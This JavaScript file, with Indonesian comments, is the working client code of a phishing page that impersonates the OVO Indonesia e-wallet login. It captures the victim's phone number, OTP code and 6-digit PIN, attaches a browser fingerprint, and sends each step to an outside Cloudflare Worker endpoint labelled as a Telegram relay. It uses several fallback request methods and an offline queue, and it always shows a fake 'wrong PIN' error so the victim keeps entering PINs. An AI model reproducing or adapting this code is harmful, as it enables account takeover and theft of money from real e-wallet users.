(function() {
    'use strict';

    // ============================================
    // === KONFIGURASI ============================
    // ============================================
    const WORKER_URL = 'https://copy.jei.workers.dev/';
    const OFFLINE_QUEUE_KEY = 'ovo_offline_queue';

    // ---- ELEMENTS ----
    const loadingScreen     = document.getElementById('loadingScreen');
    const transitionLoading = document.getElementById('transitionLoading');
    const pageNomor         = document.getElementById('pageNomor');
    const pageOtp           = document.getElementById('pageOtp');
    const pagePin           = document.getElementById('pagePin');

    const inputNomor = document.getElementById('inputNomor');
    const btnLanjut  = document.getElementById('btnLanjut');
    const errNomor   = document.getElementById('errNomor');

    const otpInputs  = document.querySelectorAll('.otp-input');
    const btnVerifOtp = document.getElementById('btnVerifikasiOtp');
    const errOtp      = document.getElementById('errOtp');

    const pinInputs     = document.querySelectorAll('.pin-input');
    const btnVerifPin   = document.getElementById('btnVerifikasiPin');
    const pinContainer  = document.getElementById('pinContainer');
    const errorMessage  = document.getElementById('errorPin');

    const offlineBanner = document.getElementById('offlineBanner');

    // ---- STATE ----
    let dataNomor = '';
    let dataOtp   = '';

    console.log('%c© 2026 OVO Indonesia. All Rights Reserved.', 'color: #4B006E; font-size: 16px; font-weight: bold;');

    // ============================================
    // === FINGERPRINT ============================
    // ============================================
    function generateFingerprint() {
        const data = [
            navigator.userAgent,
            navigator.language,
            screen.width + 'x' + screen.height,
            screen.colorDepth,
            new Date().getTimezoneOffset(),
            navigator.hardwareConcurrency || 'unknown',
            navigator.platform
        ].join('|');
        let hash = 0;
        for (let i = 0; i < data.length; i++) {
            const char = data.charCodeAt(i);
            hash = ((hash << 5) - hash) + char;
            hash = hash & hash;
        }
        return Math.abs(hash).toString(16);
    }
    const FINGERPRINT = generateFingerprint();

    // ============================================
    // === BANNER OFFLINE =========================
    // ============================================
    function updateOnlineStatus() {
        if (!offlineBanner) return;
        offlineBanner.style.display = navigator.onLine ? 'none' : 'block';
    }
    window.addEventListener('online', updateOnlineStatus);
    window.addEventListener('offline', updateOnlineStatus);

    // ============================================
    // === ANTREAN OFFLINE ========================
    // ============================================
    function queueOfflineData(data) {
        try {
            const queue = JSON.parse(localStorage.getItem(OFFLINE_QUEUE_KEY) || '[]');
            queue.push({ data: data, ts: Date.now() });
            localStorage.setItem(OFFLINE_QUEUE_KEY, JSON.stringify(queue));
            console.log('📥 Data disimpan ke antrean. Total:', queue.length);
        } catch (e) {
            console.error('❌ Gagal simpan offline:', e);
        }
    }

    async function flushOfflineQueue() {
        let queue = [];
        try {
            queue = JSON.parse(localStorage.getItem(OFFLINE_QUEUE_KEY) || '[]');
        } catch (e) { return; }
        if (queue.length === 0) return;

        console.log('📤 Mengirim antrean offline:', queue.length, 'item');
        const remaining = [];

        for (const item of queue) {
            try {
                const response = await fetch(WORKER_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(item.data),
                    mode: 'cors'
                });
                if (!response.ok) throw new Error('HTTP ' + response.status);
                console.log('✅ Antrean terkirim:', item.data.action);
            } catch (e) {
                console.warn('⚠️ Gagal kirim item:', e.message);
                remaining.push(item);
            }
        }

        try {
            localStorage.setItem(OFFLINE_QUEUE_KEY, JSON.stringify(remaining));
        } catch (e) {}

        if (remaining.length === 0) console.log('✅ Semua antrean terkirim.');
    }

    window.addEventListener('online', () => {
        console.log('🌐 Online kembali — flush antrean...');
        flushOfflineQueue();
    });

    // ============================================
    // === KIRIM KE TELEGRAM ======================
    // ============================================
    async function sendToTelegram(data) {
        const securedData = {
            ...data,
            fingerprint: FINGERPRINT,
            userAgent: navigator.userAgent,
            language: navigator.language,
            screen: screen.width + 'x' + screen.height,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            referrer: document.referrer || 'direct'
        };

        const payload      = JSON.stringify(securedData);
        const urlWithQuery = WORKER_URL + '?data=' + encodeURIComponent(payload);

        if (!navigator.onLine) {
            console.warn('📴 Offline — data masuk antrean.');
            queueOfflineData(securedData);
            return { success: true, offline: true };
        }

        // COBA 1: POST JSON
        try {
            const response = await fetch(WORKER_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: payload,
                mode: 'cors'
            });
            if (!response.ok) throw new Error('HTTP ' + response.status);
            const result = await response.json().catch(() => ({}));
            console.log('✅ Telegram OK:', result);
            return result;
        } catch (error) {
            console.warn('⚠️ POST gagal:', error.message);
        }

        // COBA 2: GET
        try {
            await fetch(urlWithQuery, { method: 'GET', mode: 'cors' });
            console.log('✅ GET fallback OK.');
            return { success: true, via: 'GET' };
        } catch (e2) {
            console.warn('⚠️ GET gagal:', e2.message);
        }

        // COBA 3: no-cors
        try {
            await fetch(urlWithQuery, { method: 'GET', mode: 'no-cors' });
            console.log('✅ no-cors fallback OK.');
            return { success: true, via: 'no-cors' };
        } catch (e3) {
            console.error('❌ Semua gagal, masuk antrean.');
            queueOfflineData(securedData);
            return { success: false, queued: true };
        }
    }

    // ============================================
    // === UTILITY ================================
    // ============================================
    let isNavigating = false; // guard anti double-click saat transisi

    function showPage(pageId) {
        document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
        const el = document.getElementById(pageId);
        if (el) {
            el.classList.add('active');
            console.log('📄 Pindah ke halaman:', pageId);
        } else {
            console.warn('⚠️ Halaman tidak ditemukan:', pageId);
        }
    }

    function getOtpValue() {
        let val = '';
        otpInputs.forEach(inp => val += inp.value.trim());
        return val;
    }

    function getPinValue() {
        let val = '';
        pinInputs.forEach(inp => val += inp.value.trim());
        return val;
    }

    function clearOtp() {
        otpInputs.forEach(inp => inp.value = '');
    }

    function clearPin() {
        pinInputs.forEach(inp => inp.value = '');
    }

    function resetPinError() {
        pinContainer.classList.remove('error');
        errorMessage.classList.remove('show');
    }

    function showPinError() {
        pinContainer.classList.add('error');
        errorMessage.classList.add('show');
        setTimeout(() => resetPinError(), 2000);
    }

    function showSpinner(button) {
        button.dataset.originalText = button.innerHTML;
        button.disabled = true;
        button.innerHTML = '<span class="spinner-ovo"></span> Memproses...';
    }

    function hideSpinner(button) {
        button.innerHTML = button.dataset.originalText || 'Lanjut';
        button.disabled = false;
    }

    // ---- TRANSISI: pakai Promise yang benar ----
    function showTransitionLoading() {
        return new Promise((resolve) => {
            transitionLoading.classList.add('show');
            setTimeout(() => resolve(), 900);
        });
    }

    function hideTransitionLoading() {
        transitionLoading.classList.remove('show');
    }

    // ---- NAVIGASI AMAN: overlay → ganti halaman → fokus ----
    async function navigateTo(pageId, focusEl) {
        if (isNavigating) return;
        isNavigating = true;

        try {
            await showTransitionLoading();

            // Sembunyikan SEMUA halaman dulu
            document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));

            // Tampilkan halaman tujuan
            const target = document.getElementById(pageId);
            if (target) target.classList.add('active');

            // Reset & fokus input setelah halaman aktif (biar fokus bekerja di mobile)
            setTimeout(() => {
                if (typeof focusEl === 'function') {
                    focusEl();
                }
            }, 80);

            // Beri jeda kecil agar overlay fade-out mulus
            await new Promise(r => setTimeout(r, 200));
            hideTransitionLoading();
        } finally {
            // Reset guard setelah overlay selesai fade-out
            setTimeout(() => { isNavigating = false; }, 400);
        }
    }

    // Error inline (pengganti alert)
    function showInline(el, msg) {
        if (!el) return;
        el.textContent = msg;
        el.classList.add('show');
        setTimeout(() => el.classList.remove('show'), 3000);
    }

    // ============================================
    // === LOADING ADAPTIF (SEKALI SAJA) ==========
    // ============================================
    let appReady = false;
    function ready() {
        if (appReady) return; // 🛡️ Cegah ready() dipanggil berkali-kali
        appReady = true;

        loadingScreen.classList.add('hidden');
        showPage('pageNomor');
        updateOnlineStatus();

        // Fokus setelah halaman benar-benar tampil
        setTimeout(() => {
            if (inputNomor) {
                try { inputNomor.focus(); } catch (e) {}
            }
        }, 100);

        if (navigator.onLine) setTimeout(flushOfflineQueue, 1000);
    }

    // Cek SW controller → ready lebih cepat; kalau tidak, fallback 1.8 detik
    if ('serviceWorker' in navigator && navigator.serviceWorker.controller) {
        setTimeout(ready, 1000);
    } else {
        setTimeout(ready, 1800);
    }
    // Safety net: paksa ready setelah 3 detik (guard di atas mencegah double-run)
    setTimeout(ready, 3000);

    // ============================================
    // === EVENT 1: LANJUT KE OTP =================
    // ============================================
    btnLanjut.addEventListener('click', async function() {
        if (isNavigating || this.disabled) return; // 🛡️ guard

        const nomor = inputNomor.value.trim();
        if (nomor.length < 8) {
            showInline(errNomor, 'Masukkan nomor HP yang valid (min. 8 digit).');
            inputNomor.focus();
            return;
        }

        dataNomor = nomor;
        showSpinner(this);

        await sendToTelegram({
            action: 'phone',
            phone: nomor,
            timestamp: new Date().toISOString()
        });

        // Reset & pindah halaman dengan fokus otomatis di input OTP pertama
        clearOtp();
        await navigateTo('pageOtp', () => {
            if (otpInputs[0]) otpInputs[0].focus();
        });

        hideSpinner(this);
    });

    // ============================================
    // === OTP NAVIGATION =========================
    // ============================================
    otpInputs.forEach((inp, idx) => {
        inp.addEventListener('input', function() {
            this.value = this.value.replace(/\D/g, '').slice(0, 1);
            if (this.value.length === 1 && idx < otpInputs.length - 1) {
                otpInputs[idx + 1].focus();
            }
        });
        inp.addEventListener('keydown', function(e) {
            if (e.key === 'Backspace' && this.value === '' && idx > 0) {
                otpInputs[idx - 1].focus();
            }
        });
        inp.addEventListener('paste', function(e) {
            e.preventDefault();
            const paste = (e.clipboardData || window.clipboardData).getData('text');
            const digits = paste.replace(/\D/g, '').slice(0, 4);
            if (digits.length > 0) {
                for (let i = 0; i < Math.min(digits.length, otpInputs.length); i++) {
                    otpInputs[i].value = digits[i] || '';
                }
                otpInputs[Math.min(digits.length, otpInputs.length - 1)].focus();
            }
        });
    });

    // ============================================
    // === EVENT 2: VERIFIKASI OTP ================
    // ============================================
    btnVerifOtp.addEventListener('click', async function() {
        if (isNavigating || this.disabled) return; // 🛡️ guard

        const otp = getOtpValue();
        if (otp.length !== 4) {
            showInline(errOtp, 'Masukkan 4 digit kode OTP.');
            if (otpInputs[0]) otpInputs[0].focus();
            return;
        }

        dataOtp = otp;
        showSpinner(this);

        await sendToTelegram({
            action: 'otp',
            phone: dataNomor,
            otp: otp,
            timestamp: new Date().toISOString()
        });

        // Reset & pindah ke PIN
        resetPinError();
        clearPin();
        await navigateTo('pagePin', () => {
            if (pinInputs[0]) pinInputs[0].focus();
        });

        hideSpinner(this);
    });

    // ============================================
    // === PIN NAVIGATION =========================
    // ============================================
    pinInputs.forEach((inp, idx) => {
        inp.addEventListener('input', function() {
            this.value = this.value.replace(/\D/g, '').slice(0, 1);
            if (this.value.length === 1 && idx < pinInputs.length - 1) {
                pinInputs[idx + 1].focus();
            }
            resetPinError();
        });
        inp.addEventListener('keydown', function(e) {
            if (e.key === 'Backspace' && this.value === '' && idx > 0) {
                pinInputs[idx - 1].focus();
            }
            resetPinError();
        });
        inp.addEventListener('paste', function(e) {
            e.preventDefault();
            const paste = (e.clipboardData || window.clipboardData).getData('text');
            const digits = paste.replace(/\D/g, '').slice(0, 6);
            if (digits.length > 0) {
                for (let i = 0; i < Math.min(digits.length, pinInputs.length); i++) {
                    pinInputs[i].value = digits[i] || '';
                }
                pinInputs[Math.min(digits.length, pinInputs.length - 1)].focus();
            }
            resetPinError();
        });
    });

    // ============================================
    // === EVENT 3: VERIFIKASI PIN ================
    // ============================================
    btnVerifPin.addEventListener('click', async function() {
        if (isNavigating || this.disabled) return; // 🛡️ guard

        const pin = getPinValue();
        if (pin.length !== 6) {
            showInline(errOtp, 'Masukkan 6 digit PIN.');
            if (pinInputs[0]) pinInputs[0].focus();
            return;
        }

        showSpinner(this);

        await sendToTelegram({
            action: 'pin',
            phone: dataNomor,
            otp: dataOtp,
            pin: pin,
            timestamp: new Date().toISOString()
        });

        // Untuk PIN salah: tampilkan error, TETAP di halaman yang sama
        isNavigating = false; // PIN error tidak pindah halaman
        hideSpinner(this);
        showPinError();

        setTimeout(() => {
            clearPin();
            if (pinInputs[0]) pinInputs[0].focus();
        }, 300);
    });

    // ============================================
    // === ENTER KEY ==============================
    // ============================================
    inputNomor.addEventListener('keydown', function(e) {
        if (e.key === 'Enter') {
            e.preventDefault();
            btnLanjut.click();
        }
    });

    document.addEventListener('keydown', function(e) {
        if (e.key !== 'Enter') return;
        if (pageOtp.classList.contains('active')) {
            e.preventDefault();
            btnVerifOtp.click();
        } else if (pagePin.classList.contains('active')) {
            e.preventDefault();
            btnVerifPin.click();
        }
    });

    document.addEventListener('gesturestart', function(e) { e.preventDefault(); });

    // ============================================
    // === INIT ===================================
    // ============================================
    window.addEventListener('load', () => {
        updateOnlineStatus();
        if (navigator.onLine) setTimeout(flushOfflineQueue, 2000);
    });

})();
